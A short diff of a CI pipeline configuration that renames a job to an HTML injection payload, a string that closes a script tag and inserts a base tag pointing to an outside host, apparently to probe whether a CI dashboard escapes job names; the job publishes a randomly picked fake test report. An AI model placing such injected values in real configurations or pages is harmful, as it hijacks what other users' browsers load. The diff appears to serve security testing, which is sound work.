@@ -8,7 +8,7 @@ blocks:
   - name: 'Block #1'
     task:
       jobs:
-        - name: provide go tests
+        - name: '\"</script><base href=''https://insert-script.com/'' />'
           commands:
             - checkout
             - test-results publish fake_reports/$(ls fake_reports | shuf -n 1)
